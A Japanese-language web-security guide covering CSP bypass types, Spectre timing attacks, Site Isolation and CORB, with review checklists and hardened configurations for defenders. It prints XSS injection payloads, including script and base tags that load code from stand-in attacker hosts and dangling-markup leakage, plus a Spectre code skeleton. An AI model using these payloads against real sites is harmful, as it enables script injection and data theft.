**なぜ通るか**：`'unsafe-inline'` は、`<script>...</script>` のようなインラインスクリプト要素と `onerror=` 等のインラインイベントハンドラの実行を明示的に許可するキーワードである。CSPが本来もっとも防ぎたい「注入されたインラインスクリプト」を、この1語が無効化してしまう。ソースリストに厳格なドメイン列挙があっても、OR条件なので `'unsafe-inline'` にマッチした時点で許可される。レビューでは `script-src` に `'unsafe-inline'`（かつ後述のnonce/hashが無い）を見たら、その時点でスクリプト実行制御は事実上無効とみなす。

### 類型2：`'unsafe-eval'` と `data:` — 文字列からのコード生成

```
Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-eval' data: http://*
```

```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

（base64 `YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==` は `alert(document.domain)`）

**なぜ通るか**：`data:` スキームがソースリストにあると、`data:` URI で表現したスクリプトを外部スクリプトとして読み込めてしまう。`data:` はネットワークを介さず「その場でコンテンツを埋め込む」ため、実質インライン注入と同じ危険性を持つ。加えて `'unsafe-eval'` は `eval()` / `Function()` / `setTimeout("...")` など「文字列をコードとして評価する」APIを解禁する。テンプレートエンジンやライブラリが内部で `eval` 相当を使う場合、`'unsafe-eval'` があるとそこが実行経路になる。**`data:` を `script-src` に入れてはならない**、が実務上の結論。

### 類型3：ワイルドカード `*` / スキームソース

```
Content-Security-Policy: script-src 'self' https://facebook.com https://google.com https: data *
```

```html
"/>'><script src=https://attacker.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```

**なぜ通るか**：`*` は任意オリジンからの読み込みを許可する（ただし `data:`/`blob:`/`filesystem:` スキームは `*` には含まれず個別指定が必要、という細かな仕様がある）。`https:` のようなスキームだけのソースも「HTTPSならどこでも可」を意味し、攻撃者管理ドメインを排除できない。ワイルドカードや裸のスキームソースは、事実上ホワイトリストを無意味化する。

### 類型4：`object-src` の欠落 — プラグイン経路

```
Content-Security-Policy: script-src 'self'
```

`script-src` だけを厳格に書き、`object-src` も `default-src` も無いケース。

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

**なぜ通るか**：`<object>` / `<embed>` の読み込みは `object-src`（無ければ `default-src`）が支配する。両方欠落していると、`<object>` に `data:text/html` を渡してHTMLごと（＝その中のスクリプトごと）実行できる。だから最小限の堅牢CSPでも `object-src 'none'` は必須とされる。古い環境では Flash（`.swf`）の `allowScriptAccess` を悪用する古典的経路もあり、`ajax.googleapis.com` 上の `charts.swf` を使う実例が知られる（現在はFlash廃止で成立しにくいが、原理として `object-src` 欠落の危険を示す）。

### 類型5：`'self'` とファイルアップロード — 同一オリジンの信頼が仇に

```
Content-Security-Policy: script-src 'self'; object-src 'none'
```

一見堅牢だが、アプリが**同一オリジンにユーザーファイルを保存できる**場合に崩れる。

```html
"/>'><script src="/user_upload/mypic.png.js"></script>
```

**なぜ通るか**：`'self'` は「レスポンスを返したのと同じオリジン」を許可する。攻撃者がスクリプト内容のファイルを自オリジンにアップロードできれば、それは `'self'` にマッチする。多くのサーバは拡張子や `Content-Type` の検証が甘く、`.png.js` や画像の中にJSを潜ませたポリグロットが通る。**`'self'` を許可するなら、アップロード物が同一オリジンから任意 `Content-Type` で配信され得ないか**をセットで確認する必要がある。

> 出典: Content-Security-Policy (CSP) Bypass Techniques — https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques/blob/main/README.md

### 類型6：JSONPエンドポイント — 信頼ドメインが実行装置になる

```
Content-Security-Policy: script-src 'self' https://www.google.com; object-src 'none'
```

```html
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
```

**なぜ通るか**：JSONP（JSON with Padding）は、`callback` パラメータで指定した関数名でJSONを包んで返す仕組みで、レスポンスは実行可能なJavaScriptになる。ホワイトリストに載った巨大ドメインには古いJSONPエンドポイントが残っていることがあり、`callback=alert` のように任意の関数呼び出しを差し込める。CSP的にはそのドメインは正規に許可されているため、ブラウザは何も疑わずスクリプトとして実行する。これが「信頼ドメインを列挙するホワイトリスト方式CSP」の構造的弱点で、Googleの CSP Evaluator が特定ドメインを危険と警告する理由でもある。**大手CDN/APIドメインを丸ごと `script-src` に入れると、そこのJSONPが実行経路になる**。

### 類型7：信頼CDN上の脆弱／悪用可能ライブラリ（AngularJS 等）

```
Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com/; object-src 'none'
```

CDNを信頼すると、そのCDNが配る古いライブラリを使ってサンドボックスを破れる。代表がAngularJS（1.x）である。

```html
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

```html
ng-app"ng-csp ng-click=$event.view.alert(1337)>
<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
```

**なぜ通るか**：AngularJS はHTML内の `{{ }}` 式を自前のサンドボックスで評価する。歴代バージョンでこのサンドボックスの脱出（`$eval.constructor('...')()` のようにコンストラクタ経由でグローバル `Function` に到達する等）が繰り返し発見された。`ng-csp` 属性はAngularを「CSP互換モード」で動かすが、それでも式評価という実行経路自体は残る。CSPは「cdnjs からのスクリプト読み込み」を許可しているだけで、その中身がテンプレート式を実行することまでは制御できない。同様に古い Prototype.js なども悪用対象になる。**バージョン注記**：これはAngularJS 1.x系（2018年にサポート終了、2022年にEOL）の話で、Angular 2+ は別物。だが古いCDNパスは今も配信され続けるため、CDNをホワイトリストする限り現在も有効な迂回になりうる。

### 類型8：オープンリダイレクト連鎖 — ホワイトリスト間のジャンプ

```
Content-Security-Policy: script-src 'self' accounts.google.com/random/ website.with.redirect.com
```

```html
">'><script src="https://website.with.redirect.com/redirect?url=https%3A//accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
```

**なぜ通るか**：CSPのソースマッチは**リダイレクト後の最終URLではなく、初回リクエスト先のURL**で行われる（正確には、リダイレクト先はパス部分のマッチが緩められる仕様がある）。ホワイトリストにパス制限付きで載ったドメインでも、別の許可ドメインのオープンリダイレクトを踏み台にすれば、パス制限を回避してJSONPエンドポイントへ到達できる。**ホワイトリストに載せるドメインは、オープンリダイレクトを持たないことまで確認**しないと連鎖される。

### 類型9：`iframe srcdoc` / `data:` フレーム — 実行文脈のすり替え

```
Content-Security-Policy: default-src 'self' data: *; connect-src 'self'; script-src 'self'
```

```html
<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
```

**なぜ通るか**：`srcdoc` で作った子フレームや `data:` フレームは、親のCSPの継承関係が構成によって変わる。上記のように `default-src` に `data:` と `*` が入っていると、子文脈でのスクリプト読み込みが緩いソースにマッチしてしまう。フレーム系は `frame-src` / `child-src` と、子文書自身のCSP継承を意識して塞ぐ必要がある。

### 類型10：`base-uri` の欠落 — 相対パスの基準を奪う

これは「見落とされやすい」筆頭。次はスクリプトソースが完璧に見える。

```
Content-Security-Policy: script-src 'self'; object-src 'none'
```

だが `base-uri` が無く、ページが相対パスで `<script src="app.js">` のように読み込んでいて、かつHTML注入点があると：

```html
<base href="https://attacker.example/">
```

**なぜ通るか**：`<base>` タグは、ページ内すべての相対URLの基準オリジンを変える。注入した `<base>` により、本来 `'self'` から読むはずだった `app.js` が攻撃者オリジンから読み込まれる。`script-src 'self'` は「`'self'` から読む」ことを許可しているだけで、`'self'` が指すオリジンが `<base>` で書き換えられる可能性まではケアしない。**対策は `base-uri 'none'`（または `'self'`）を明示すること**。`base-uri` は `default-src` にフォールバックしない独立ディレクティブなので、書かない限り無制限になる点が重要。

> ⚠️ **未取得の資料**: 「Content Security Policy (CSP) Bypass（HackTricks）」は自動取得できませんでした（理由: egress プロキシが `tollbit.hacktricks.wiki` への302リダイレクト先で HTTP 402 Payment Required を返したため）。以下のURLからご自身で直接ご覧ください: https://hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html
>
> （以下は未取得資料の補足として一般知識および代替検索結果に基づく解説です）HackTricks の該当ページは、上記の `base-uri` 迂回・JSONP・信頼ドメイン悪用に加えて、次の観点を整理している。**nonce の弱点**：`script-src 'nonce-xxxx'` は毎回のレスポンスで暗号学的に十分ランダムな値を生成することが前提。nonceを複数レスポンスで**使い回す**、静的固定にする、弱い乱数で生成すると、値を推測・再利用してnonce付きスクリプトを注入できる。**`strict-dynamic`**：`script-src 'nonce-rAnd0m' 'strict-dynamic'` は、nonce（またはhash）で許可された「信頼スクリプト」が動的に生成した子スクリプトへ信頼を伝播させ、代わりにホスト名ホワイトリストや `'self'` を無視する。これによりJSONP/信頼CDN型の迂回を封じられる一方、信頼スクリプト自体が `document.createElement('script')` で任意srcを注入できる作りだと、そこが新たな経路になる。**dangling markup injection**：スクリプトを実行できなくても、閉じられていない `<img src='https://attacker/?` のような断片を注入し、後続のHTML（CSRFトークンやnonce）をクエリ文字列として攻撃者サーバへ送出させ情報を漏らす手法。`connect-src`/`img-src` が緩いと成立する。**PHP_SELF / RPO（Relative Path Overwrite）**：`$_SERVER['PHP_SELF']` をそのままページURLに反映するアプリで、パス操作により相対パス基準をずらし、キャッシュされた別リソースをスクリプトとして読ませる古典技法。いずれも「`script-src` だけ堅くしても、周辺ディレクティブ（`base-uri`/`connect-src`/`img-src`）とアプリ実装の穴で漏れる」という一貫した教訓を示す。
>
> 出典: Content Security Policy (CSP) Bypass — HackTricks（未取得） https://hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html ／ 補足検索: CSP and Bypasses — https://www.cobalt.io/blog/csp-and-bypasses ／ CSP Bypasses: Advanced Exploitation Guide — https://www.intigriti.com/researchers/blog/hacking-tools/content-security-policy-csp-bypasses

### レビュー観点のまとめ：弱い構成のチェックリスト

防御側が構成をレビューするときの優先順位を、危険度順に整理する。

| 見つけたら要注意 | なぜ危険か | 望ましい対処 |
|---|---|---|
| `script-src` に `'unsafe-inline'`（nonce/hash併用なし） | 注入インラインが即実行 | nonce または hash に置換 |
| `script-src` に `'unsafe-eval'` | 文字列→コード評価が解禁 | 削除し、evalを使わない実装へ |
| `*` / `https:` / `data:` を `script-src` に含む | ホワイトリストが無意味化 | 具体オリジン限定、`data:`除去 |
| `object-src` と `default-src` の両方欠落 | `<object>` 経由でHTML/スクリプト実行 | `object-src 'none'` 明示 |
| `base-uri` 未指定 | `<base>` で相対パス基準を奪取 | `base-uri 'none'` 明示 |
| 大手CDN/APIドメインを丸ごと許可 | JSONP・古いライブラリで迂回 | 必要パスに限定、`strict-dynamic`検討 |
| `'self'` 許可＋任意ファイルアップロード可 | 自オリジンからJS配信 | アップロード物の配信オリジン分離 |
| nonce の使い回し・固定・弱乱数 | nonce再利用で注入 | レスポンス毎に強乱数で再生成 |

**現代的なベストプラクティス（2024〜2025年時点の推奨）**は、ホスト名ホワイトリスト方式をやめ、nonce ベース＋ `strict-dynamic` に寄せる構成である。

```
Content-Security-Policy: script-src 'nonce-{ランダム}' 'strict-dynamic'; object-src 'none'; base-uri 'none';
```

**なぜ強いか**：`'strict-dynamic'` があるとホスト名ソースと `'self'` は無視されるため、JSONP・信頼CDN・アップロード迂回（類型5〜9）がまとめて封じられる。残る攻撃面は「nonce の生成品質」と「信頼スクリプトが安全に子スクリプトを生成しているか」に絞られ、レビューが局所化できる。`object-src 'none'` と `base-uri 'none'` を必ず添えることで、類型4・10も同時に塞ぐ。

最後に、CSPは**多層防御の一枚**であることを再確認したい。上記のどの類型も、根本原因はHTML/属性への注入点そのものであり、CSPはそれが起きた後の実行を止める設計になっている。したがってレビューでは「CSPの穴」と「注入点の有無」を両輪で見る。CSPが完璧でも注入点があれば dangling markup で情報が漏れうるし、注入点が無ければ弱いCSPでも直ちに被害には至らない。構成の弱さを見抜く目的は、**万一の注入時に最後の一線が機能するかを保証すること**にある。

> 出典: Content-Security-Policy (CSP) Bypass Techniques — https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques/blob/main/README.md

## Site Isolation・Spectre緩和・クリックジャッキング前提

### この節で扱うこと

ここまでの節で扱ってきた同一オリジンポリシー（SOP）・CORS・Cookie属性・CSPは、いずれも**レンダラプロセスの内側で、ブラウザが自主的に守るルール**でした。ところが2018年のSpectre／Meltdown公表以降、「レンダラプロセスの内側のルールは、CPUのサイドチャネルやレンダラの脆弱性の前では前提が崩れる」ことが明確になりました。そこでChromeが導入したのが **Site Isolation（サイト分離）** ——「異なるサイトのコンテンツを、そもそも同じOSプロセスのメモリ空間に同居させない」という、OSレベルの防御線です。

本節では次の3つを、原典に沿って仕組みレベルで解説します。

1. **Spectre／Meltdown がWebに何を要求したか**（高精度タイマー規制、`SharedArrayBuffer` 無効化、V8の緩和）
2. **Site Isolation の設計**（「サイト」の定義、OOPIF、CORB／ORB、脅威モデル、メモリコスト、開発者から見た挙動変化）
3. **クリックジャッキング（UI redress）の前提と防御**（`frame-ancestors`、`X-Frame-Options`、SameSite、なぜ素朴なframe busterは破られるか）

この3つを1つの節にまとめるのは偶然ではありません。いずれも「**攻撃者のページが、あなたのページやデータを自分のプロセス／自分のフレームツリーに引き込めるか**」という同一の問いに対する、別々のレイヤの答えだからです。Spectreは「引き込まれたデータはメモリから読まれ得る」と教え、Site Isolation／CORBは「そもそも引き込ませない」で応え、クリックジャッキング防御は「そもそも埋め込ませない」で応えます。

> **スコープの注意**: 本節は防御・検出のための解説です。記載する設定・スクリプト・挙動の確認手順は、自分が所有するか明示的な許可を得た環境でのみ試してください。実在サービスの本番環境への無許可検証は行わないでください。

---

### 1. Spectre／Meltdown ——「同じプロセスにあるメモリは読まれうる」

#### 1.1 何が起きたのか

2018年1月3日に公表された Meltdown と Spectre は、ソフトウェアのバグではなく、**現代CPUの投機的実行（speculative execution）というマイクロアーキテクチャ上の最適化そのもの**に起因する脆弱性です。Chrome for Developers の解説記事は、この一次情報（Project Zero のブログ等）を前提としたうえで、「Webプラットフォームにとって何が変わるか」に話を絞っています。

> ⚠️ 原典（`developer.chrome.com/blog/meltdown-spectre`）は投機的実行やキャッシュタイミングの仕組み自体は既存の解説に譲っており、具体的な数値やバージョンも記載していません。**（以下1.2のCPU側の仕組みと、1.3の数値・バージョンは、原典の内容を理解するための一般知識に基づく補足です。）**

#### 1.2 仕組み（補足）

投機的実行とは、CPUが分岐の結果を待たずに「たぶんこちらに進む」と予測して先に命令を実行しておき、予測が外れたらアーキテクチャ上の状態（レジスタやメモリ）を巻き戻す仕組みです。問題は、**巻き戻されるのはアーキテクチャ状態だけで、CPUキャッシュの状態は巻き戻らない**点にあります。

典型的な Spectre variant 1（境界チェックバイパス）の骨格はこうです。

```c
// 攻撃者が index を制御できる。array1_size より大きい値を渡す。
if (index < array1_size) {          // ← 分岐予測を「成立する」と訓練しておく
    y = array2[ array1[index] * 4096 ];  // ← 投機的に境界外読み出しが実行される
}
```

1. 攻撃者は `index` に正常値を何度も渡し、分岐予測器に「この分岐は成立する」と学習させる。
2. その後 `index` に境界外の値を渡す。CPUは `array1_size` のロード完了を待たずに投機実行し、**本来読めないはずの `array1[index]`（＝秘密の1バイト）**を読む。
3. その値を添字に使って `array2` を触るため、**秘密の値に対応するキャッシュラインだけがキャッシュに載る**。
4. 分岐が実は不成立だと判明し、投機はロールバックされる。しかしキャッシュは汚れたまま。
5. 攻撃者は `array2` の各要素へのアクセス時間を測り、**速く読めた要素の添字＝秘密の値**として復元する（フラッシュ＆リロード）。

ここでWeb特有の重要点は、**この攻撃はJavaScriptからも成立しうる**ことです。JITコンパイルされたJSコードも同じCPU上で投機実行されるため、「攻撃者のJSが、同じレンダラプロセスのアドレス空間にある他サイトのデータを読む」という、SOPを完全に無効化するシナリオが現実味を帯びました。

#### 1.3 ブラウザ側の緩和 —— タイマーを鈍らせる

上記ステップ5が示すとおり、この攻撃は**高精度な時間計測能力**に依存します。そこで主要ブラウザは真っ先にタイマーを潰しました。原典は次のように述べています。

- **`performance.now()` の分解能低下**: 「すべての主要ブラウザが `performance.now()` の分解能を下げた」。
  - （補足: Chrome 64（2018年1月）では分解能を **20µs から 100µs** へ粗くし、さらに**ランダムなジッタ（揺らぎ）**を加えました。ジッタが重要なのは、単に丸めただけでは「同じ測定を何千回も繰り返して平均を取る」ことで分解能を復元できてしまうためです。後年、クロスオリジン分離（COOP+COEP）済みのページに限って 5µs へ戻されています。）
- **`SharedArrayBuffer` の無効化**: 原典は「他の緩和が整うまで `SharedArrayBuffer` を無効化することを決めた」と述べています。これが必要だったのは、SABがあれば**自前の高精度タイマーを作れてしまう**からです。

```js
// SharedArrayBuffer を使った「自作タイマー」の原理（歴史的な攻撃手法の説明）
// Worker 側: 共有メモリ上のカウンタをひたすらインクリメントし続ける
const counter = new Uint32Array(sharedBuffer);
while (true) { Atomics.add(counter, 0, 1); }
// メイン側: 計測前後でカウンタを読むだけで、ナノ秒級の相対時間が得られる
```

`performance.now()` をいくら鈍らせても、SABとWorkerの組み合わせでこのような**インクリメント・カウンタ**を作られれば分解能規制は無意味になります。だからSABは「タイマー規制の抜け穴」として一時的に全面停止されました。
（補足: SABは Chrome 68 でデスクトップに復活したのち、2021年の Chrome 92 以降は **`Cross-Origin-Opener-Policy: same-origin` と `Cross-Origin-Embedder-Policy: require-corp` を両方設定した「クロスオリジン分離」状態のページでのみ利用可能**という条件付き復帰になりました。後述のCOOP/COEPが「高精度機能を使うためのパスポート」になっている背景がこれです。）

- **V8 の変更**: V8チームは既知のPoCに対する緩和を実装し、TurboFan（V8の最適化コンパイラ）のコード生成を変更しました。原典は「これらのコード生成の変更は性能上のペナルティを伴いうる」と明記しています。

そして原典は、これらはあくまで対症療法であり、**本命の防御は Site Isolation** だと位置づけます。「異なるWebサイトのページは常に異なるプロセスに置かれ、それぞれがサンドボックス内で動作する」——つまり、**読まれて困るデータをそもそも攻撃者のプロセスに入れない**というアプローチです。当時のユーザは `chrome://flags#enable-site-per-process` でオプトインできました。

> 出典: Meltdown/Spectre — https://developer.chrome.com/blog/meltdown-spectre

---

### 2. Site Isolation の設計

#### 2.1 「サイト（site）」とは何か —— オリジンとの違い

Site Isolation の設計を理解する最大の鍵は、分離の単位が**オリジンではなく「サイト」**である点です。Chromium公式ドキュメントの定義はこうです。

> サイトとは「**スキーム（scheme）と、パブリックサフィックスを含む登録済みドメイン名**。ただしサブドメイン・ポート・パスは無視する」

したがって：

| URL | オリジン | サイト |
|---|---|---|
| `https://foo.example.com:8080/a` | `https://foo.example.com:8080` | `https://example.com` |
| `https://bar.example.com/b` | `https://bar.example.com` | `https://example.com` |
| `http://example.com/` | `http://example.com` | `http://example.com`（スキームが違うので別サイト） |
| `https://user.github.io/` | `https://user.github.io` | `https://user.github.io`（`github.io` はパブリックサフィックス） |

ここで「登録済みドメイン名（registrable domain）」は、Public Suffix List（`.com`、`.co.jp`、`.github.io` などの一覧）を引いて決まる eTLD+1 です。`user.github.io` が独立したサイトになるのは、`github.io` がパブリックサフィックスとして登録されているためで、これが無ければユーザ投稿ページ同士が同一プロセスに同居してしまいます。

**なぜオリジンではなくサイトなのか**。原典は互換性を理由に挙げています。古いWebページは `document.domain` を書き換えて `a.example.com` と `b.example.com` を同一オリジン扱いにする（＝同期的にDOMを触り合う）ことができ、これは**同一プロセスでなければ実装できません**。オリジン単位で分離してしまうとこの機能が壊れるため、分離の粒度をサイトまで緩めた、という設計上のトレードオフです。

（補足・時事性: この `document.domain` による緩和は非推奨化が進み、**Chrome 115（2023年）以降はデフォルトで `document.domain` の設定が効かなくなりました**。そのため「サイト単位で妥協する理由」は今後弱まっていきます。より厳密な分離を望む場合の手段は、実験的な `chrome://flags#strict-origin-isolation`（原典に記載。`document.domain` の書き換えが壊れると明記）と、サーバが宣言する **`Origin-Agent-Cluster: ?1`** ヘッダです。後者は「このオリジンは `document.domain` を使わないので、オリジン単位のエージェントクラスタに置いてよい」とブラウザに伝えるもので、ブラウザはそれをプロセス分離のヒントとして利用できます。）

#### 2.2 脅威モデル —— 何から守るのか

原典は3つの攻撃ベクタを挙げています。

1. **侵害されたレンダラプロセス（compromised renderer）**
   レンダラは巨大なパーサとJITの塊であり、バグは現実に存在します。原典は「M69 ではレンダラコンポーネントに悪用可能性のあるバグが10件」あり、以降のリリースでも同様の件数だと述べています。つまり「レンダラは落ちる前提で設計する」のが出発点です。レンダラが乗っ取られても、そのプロセスに他サイトのデータが無ければ盗めません。

2. **Universal XSS（UXSS）**
   プロセスを完全に掌握しなくても、**レンダラ内部のSOPチェックを回避する**種類のバグ。SOPが「同じプロセス内のソフトウェアチェック」である以上、チェックそのものにバグがあれば破れます。プロセス境界はソフトウェアチェックではなくOSの保護なので、この層を迂回できません。

3. **サイドチャネル攻撃（Spectre系）**
   原典の表現では「Chrome にバグが無くても、レンダラプロセスのメモリを任意に読める」。バグではないので、パッチでは塞げません。**メモリ空間を分ける以外に根本策が無い**というのが、Site Isolation が最重要である理由です。

#### 2.3 実装 —— OOPIF とデータブロッキング

**Out-of-Process iframes（OOPIF）**: 原典いわく「クロスサイトのドキュメントは、現在のタブ内・新しいタブ・iframe のいずれのナビゲーションであっても、常に異なるプロセスに置かれる」。従来「1タブ＝1レンダラプロセス」だったモデルが、「1フレームツリー＝複数プロセスにまたがる」モデルに変わります。各プロセスはChromeのサンドボックス内で動き、できることが制限されます。

**データブロッキング**: 「クロスサイトのデータ（HTML、XML、JSON、PDFなど）は、サーバが（CORSを用いて）許可すると言わない限り、Webページのプロセスに配送されない」。これが次節のCORBです。

#### 2.4 プラットフォームとコスト

| プラットフォーム | 状況 |
|---|---|
| デスクトップ（Windows / Mac / Linux / ChromeOS） | **Chrome 67 で全サイトに対してデフォルト有効**（2018年） |
| Android | **Chrome 77 以降、RAM 2GB以上の端末**で、まずユーザがログインするサイト（認証サイト）を対象に有効化。のちにOAuthサイトやCOOP採用サイトへ拡大 |
| Android WebView / RAM 2GB未満の端末 | 非対応 |

メモリオーバーヘッドの実測値（原典記載）:

- デスクトップ Chrome 67: 多数のタブを開いて**全サイトを分離した場合に約 10〜13%**
- Android Chrome 77: **ログイン対象サイトのみを分離して約 3〜5%**

Androidが「全サイト」ではなく「ログインするサイト」に絞ったのは、この数字がそのまま理由です。プロセスごとにV8ヒープやレンダラの常駐コストが乗るため、分離するサイト数とメモリは比例します。

#### 2.5 設定・検証方法

```text
# 全サイト分離（デスクトップは既定で有効。Android等で強制したい場合）
chrome://flags#enable-site-per-process
--site-per-process
エンタープライズポリシー: SitePerProcess / SitePerProcessAndroid

# 特定オリジンだけを（サイトより細かく）分離
chrome://flags/#isolate-origins
--isolate-origins=https://foo.example.com,https://[*.]corp.example.com
エンタープライズポリシー: IsolateOrigins / IsolateOriginsAndroid

# 実験的な厳密オリジン分離（document.domain の書き換えが壊れる）
chrome://flags#strict-origin-isolation
```

有効になっているかの確認手順（原典記載）:

1. クロスサイトiframeを含むテストページを開く（原典の例: `http://csreis.github.io/tests/cross-site-iframe.html`）
2. **Chromeのタスクマネージャ（Shift+Esc）**を開き、メインページとサブフレームが**別プロセス**として並んでいることを確認する
3. `chrome://process-internals` で現在の設定状態を確認する

なお、ローカル開発で `--disable-web-security` を使う場合、原典は **`--disable-features=IsolateOrigins,site-per-process` も併せて指定する必要がある**と注意しています。プロセスが分かれているとSOP無効化フラグが期待どおりに効かないためです。

> 出典: Site Isolation（Chromium） — https://www.chromium.org/Home/chromium-security/site-isolation/

---

### 3. Cross-Origin Read Blocking（CORB）

#### 3.1 何をするものか

Site Isolation でプロセスを分けても、**攻撃者のページが自分のプロセスに他サイトのデータを「正規の手順で」引き込めてしまえば**意味がありません。`<img>` や `<script>` はCORSなしでクロスオリジンのバイトを取得できるからです。

CORBは、**レンダラプロセスが機微なクロスオリジンのデータリソース（HTML・XML・JSON）を受け取ること自体を防ぎ、代わりに空のレスポンスを見せる**仕組みです。重要なのは「リクエスト自体はバックグラウンドで発生する」点——ネットワーク的な副作用（キャッシュ、Cookie送信、サーバ側の処理）は起きますが、**バイト列がレンダラのメモリに入らない**ようにします。Spectre対策としてはこれで十分です。「読めないメモリ」は投機実行でも読めません。

#### 3.2 CORBが守る具体的な攻撃

原典が挙げる例:

```html
<!-- 攻撃者のページ。どちらも CORS プリフライトなしにリクエストが飛ぶ -->
<img src="https://your-bank.example/balance.json" />
<script src="https://your-bank.example/balance.json"></script>
```

`balance.json` は画像でもJSでもないので、**描画も実行もされません**（そこは従来どおり）。しかしCORBが無ければ、**そのJSONのバイト列は攻撃者ページのレンダラプロセスのメモリ上に一度載ります**。Spectre があれば、そこから読み出される可能性がある——これがCORBの動機です。

#### 3.3 判定ロジックと `nosniff` の役割

CORBがクロスオリジンのデータリソースをブロックする条件（原典の記述）:

- レスポンスに **`X-Content-Type-Options: nosniff`** が付いている、**かつ**
- CORSヘッダが明示的にアクセスを許可していない

`nosniff` が無い場合、CORBは**コンテンツスニッフィング**（中身のバイト列を覗いてMIMEタイプを推測する）を行います。なぜそんな面倒なことをするかというと、現実のサーバは `Content-Type` を間違えるからです（原典の例: 画像を `text/html` で配信する）。

そしてここが実務上もっとも重要な点です。**スニッフィングは「寛容side」に倒れるよう設計されています**。理由は、正規のJavaScriptファイルを誤ってブロックしてしまえばサイトが壊れるからです。つまり、

> スニッフィングに頼ると「ブロックされるべきだがされない」ケースが残る。明示的なヘッダを付けることが、より強い保護になる。

Chromium公式も同じことを別の言い方で述べています——CORBは「ベストエフォートのアプローチ」であり、ラベルの誤ったリソースとの互換性維持という制約を負っている、と。

#### 3.4 開発者がすべきこと

```http
# 1. 正しい Content-Type を付ける
Content-Type: application/json; charset=utf-8     # JSON API
Content-Type: text/html; charset=utf-8            # HTML
Content-Type: application/xml                     # XML

# 2. スニッフィングをオプトアウトする（特にユーザ固有・機微な内容のURL全て）
X-Content-Type-Options: nosniff
```

Meltdown/Spectre記事側の推奨も合わせると、開発者向けのチェックリストは次のとおりです。

- `SameSite` Cookie属性を使う（「Cookieは同一サイト由来のリクエストにのみ付与されるべき」）
- `HttpOnly` を付け、`document.cookie` の読み出しを最小化する（＝Cookie値をレンダラのJSヒープに載せない）
- **ユーザ固有・機微な内容を持つ全URLに `X-Content-Type-Options: nosniff` を付ける**
- `target="_blank"` で外部リンクを開くときは `rel="noopener"` を付ける（開いた側とのプロセス／ウィンドウ参照を切る）

（補足・時事性: CORBは2023年前後から **ORB（Opaque Response Blocking）** に置き換えが進んでいます。CORBが「HTML/XML/JSONという特定のタイプをブロックする」ブロックリスト的発想だったのに対し、ORBは「`no-cors` で取得したレスポンスは、画像・メディア・スクリプト等として正当に解釈できるものを除き**すべて**不透明化してブロックする」というアロー／デニーの向きを反転させた設計です。開発者側の対処——正しい `Content-Type` と `nosniff`——は変わりません。）

> 出典: Site Isolation for web developers — https://developer.chrome.com/blog/site-isolation

---

### 4. 開発者から見た挙動変化 —— 「同期的な全ページレイアウト」の終わり

Site Isolation はセキュリティ機能ですが、**Webプラットフォームの観測可能な挙動を変えました**。バグハンティングでも「なぜこのpostMessageが届かないのか」「なぜこのビーコンが欠測するのか」を判断するのに必要な知識です。

#### 4.1 クロスオリジンのレイアウトは非同期になった

Chromium公式の表現: 「**ページのフレームが複数プロセスに分散しうるため、全ページレイアウトはもはや同期的ではない**」。

壊れるパターンの典型:

```js
// 親フレーム側（アンチパターン）
const iframe = document.querySelector('#child');   // クロスオリジンの iframe
iframe.style.width = '800px';                      // ① リサイズ
iframe.contentWindow.postMessage('resized', '*');  // ② 直後に通知

// 子フレーム側
addEventListener('message', () => {
  // ③ ここで document.documentElement.clientWidth を読むと、
  //    まだ古い幅（リサイズ前）が返る可能性がある
});
```

**なぜそうなるか**: ①のレイアウト変更は親プロセスで起き、新しいサイズが子プロセスへ伝播するのは**プロセス間通信（IPC）経由の非同期処理**です。一方②の `postMessage` も別のIPCで飛びます。同一プロセス時代は①が同期的に子のレイアウトまで更新していたので順序が保証されていましたが、プロセスが分かれると**2つのメッセージの到着順や反映タイミングが保証されません**。

**対処**: サイズに依存する処理は、子フレーム側で `resize` イベントを待つなど、**イベント駆動**に書き換えます。「親が通知したから子のレイアウトは更新済みのはず」という仮定を置かないことです。

#### 4.2 `unload` ハンドラは信頼できない

原典が挙げる2つの変化:

1. **タイムアウト**: 同一プロセスの `unload` ハンドラは従来（事実上）いつまでも走れましたが、**クロスプロセスの `unload` ハンドラは閾値を超えると打ち切られます**。
2. **並列実行**: 従来は厳密にトップダウン順（親→子）に実行されていたものが、**プロセスをまたぐハンドラは並列に実行される**ようになりました。

さらにChromium公式は「`unload` ハンドラは実行されないことがあり、`unload` ハンドラからの `postMessage` は失敗する」と明記しています。

```js
// アンチパターン: unload で時間のかかる処理
addEventListener('unload', () => {
  doSomethingThatMightTakeALongTime();  // 打ち切られる可能性がある
});
```

**セッション終了ping等の推奨形**:

```js
// 推奨1: sendBeacon（ブラウザがページ破棄後もリクエストを送り切ることを保証する）
addEventListener('pagehide', () => {
  navigator.sendBeacon('/end-of-session');
});

// 推奨2: fetch の keepalive（ペイロードやメソッドを制御したい場合）
addEventListener('pagehide', () => {
  fetch('/end-of-session', {keepalive: true});
});
```

原典は「信頼性の理由から、`beforeunload` や `unload` より **`pagehide` イベントを使うことを推奨する**」と述べています。これは Site Isolation とは独立の理由（bfcache＝バックフォワードキャッシュとの相性、モバイルでのプロセス強制終了）もあります。`sendBeacon` / `keepalive` が効くのは、**リクエストの送信主体がレンダラではなくブラウザプロセス側のネットワークサービスに移譲される**ためで、レンダラが消えても送信が継続します。

#### 4.3 DevToolsの制約

原典の記述: 「`unload` ハンドラに対するDevToolsのサポートはほぼ欠落している。たとえば `unload` ハンドラ内のブレークポイントは効かず、`unload` 中に発行されたリクエストはNetworkパネルに現れず、`console.log` の出力も表示されないことがある」（Chromium issue #851882）。

